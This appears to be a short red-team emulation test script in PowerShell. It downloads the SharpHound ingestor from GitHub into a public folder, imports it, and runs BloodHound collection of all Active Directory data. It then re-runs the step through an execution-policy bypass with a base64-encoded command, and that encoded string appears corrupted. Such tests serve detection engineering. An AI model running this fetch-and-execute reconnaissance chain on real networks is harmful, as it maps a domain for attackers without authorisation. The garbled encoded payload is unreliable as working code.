#Atomic Test no. 19

Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "C:\Users\Public\SharpHound.ps1"
write-host "Import and Execution of SharpHound.ps1 from C:\Users\Public" -ForegroundColor Cyan
import-module C:\Users\Public\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

powershell.exe -exec bypass -EncodedCommand LgAgACAAYWA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABzAGgAYQByAHAAaABVAHUAbgBkAC4AcABzADEAOWAgAEkAbgB2AG8AaWBIACOAQgBsAG8AbwBkAEgAbwB1AG4AZAAgACOAQWBvAGWAbABIAGMAdABpAG8AbgBNAGUAdABOAG8AZAAgAEEAbABsAA==